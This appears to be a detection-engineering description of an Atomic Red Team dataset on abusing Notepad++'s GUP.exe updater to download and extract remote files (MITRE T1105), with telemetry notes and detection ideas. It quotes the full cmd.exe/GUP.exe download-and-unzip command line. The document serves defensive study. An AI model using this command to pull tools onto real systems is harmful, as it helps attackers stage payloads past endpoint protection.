# T1105-30: Ingress Tool Transfer — Arbitrary file download using the Notepad++ GUP.exe binary

## Technique Context

T1105 (Ingress Tool Transfer) represents one of the most fundamental command-and-control techniques, covering how adversaries transfer files and tools from external systems into compromised environments. This specific test demonstrates abuse of GUP.exe (Generic Update/Unzip Program), the legitimate update utility for Notepad++, to download and extract files from remote URLs. 

The technique exploits a common pattern in Living-off-the-Land Binaries (LOLBins) where legitimate software includes functionality that can be repurposed for malicious file transfers. GUP.exe was designed to download updates for Notepad++ but can be weaponized to retrieve arbitrary files from attacker-controlled servers. Detection engineers focus on monitoring for unexpected network connections from system utilities, file creation patterns, and command-line arguments that suggest abuse of legitimate binaries for file transfer operations.

## What This Dataset Contains

This dataset captures the complete execution chain of using GUP.exe for arbitrary file download. The technique begins with PowerShell execution that spawns cmd.exe with the command line `"cmd.exe" /c mkdir "c:\Temp" & cd C:\AtomicRedTeam\atomics\T1105\bin\ & GUP.exe -unzipTo "" "C:\Temp" "Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"`.

The GUP.exe process (PID 38132) executes with command line `GUP.exe -unzipTo "" "C:\Temp" "Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"`, demonstrating the abuse syntax. Sysmon EID 22 captures the DNS resolution for "getsamplefiles.com" resolving to "::ffff:172.67.141.191;::ffff:104.21.9.51", showing the network reconnaissance phase.

The file operations are extensively documented through Sysmon EID 11 events, showing the initial ZIP file creation at `C:\Windows\Temp\sample-2.zip` followed by extraction to multiple files including `C:\temp\Sample\sample-2\sample-5.eps`, `C:\temp\Sample\sample-2\sample-4.bmp`, `C:\temp\Sample\sample-2\sample-5.svg`, and associated macOS metadata files under `__MACOSX\` directories.

Security EID 4688 events provide complete process creation telemetry for the full execution chain: PowerShell → cmd.exe → GUP.exe, with all command lines preserved due to audit policy settings.

## What This Dataset Does Not Contain

This dataset lacks network connection telemetry beyond DNS resolution. While we see the DNS query for getsamplefiles.com, there are no Sysmon EID 3 (Network Connection) events showing the actual HTTPS download connection from GUP.exe to the remote server. This is likely filtered by the sysmon-modular configuration which may not capture all network connections from legitimate binaries.

The dataset also doesn't contain any Windows Defender detection events despite real-time protection being active. The technique appears to have executed without triggering endpoint protection, which is realistic since GUP.exe is a legitimate signed binary performing ostensibly normal update operations.

There's no evidence of the actual content analysis of downloaded files - we see file creation events but no indication of whether the downloaded ZIP contained malicious payloads or was scanned by security tools.

## Assessment

This dataset provides excellent coverage for detecting GUP.exe abuse, with strong telemetry across multiple data sources. The Security channel's process creation events with full command-line logging capture the critical detection opportunity - the unusual command-line syntax of GUP.exe with remote URLs. The Sysmon file creation events provide detailed forensic evidence of what was actually downloaded and extracted.

The DNS query telemetry adds valuable context for network-based detection, even without the full network connection data. The process tree reconstruction is complete through Security events, allowing analysts to understand the full attack chain from initial PowerShell execution through final file extraction.

The main limitation is the lack of network connection telemetry, which would strengthen detection of the actual file transfer phase. However, the combination of process execution, command-line analysis, DNS resolution, and file system activity provides multiple robust detection vectors.

## Detection Opportunities Present in This Data

1. **GUP.exe process execution with remote URL arguments** - Monitor Security EID 4688 for GUP.exe processes with command lines containing "http://" or "https://" URLs, especially when the parent process is not a Notepad++ update mechanism.

2. **GUP.exe process creation outside expected directories** - Alert on GUP.exe execution from paths other than standard Notepad++ installation directories, as seen here executing from `C:\AtomicRedTeam\atomics\T1105\bin\`.

3. **Unusual command-line patterns for GUP.exe** - Detect GUP.exe with `-unzipTo` parameter combined with arbitrary destination paths and remote URLs, particularly when not invoked by legitimate update processes.

4. **DNS queries from GUP.exe to non-Notepad++ domains** - Monitor Sysmon EID 22 for DNS resolutions from GUP.exe to domains other than official Notepad++ update servers.

5. **File creation patterns suggesting arbitrary downloads** - Correlate Sysmon EID 11 file creation events from GUP.exe with unusual file types or destinations, especially outside typical update directories.

6. **Process tree analysis for LOLBin chaining** - Detect PowerShell or cmd.exe spawning GUP.exe with suspicious arguments, indicating potential Living-off-the-Land Binary abuse.

7. **Unexpected network-capable utilities in non-standard locations** - Alert on network activity from legitimate binaries executing from temporary or non-standard directories.
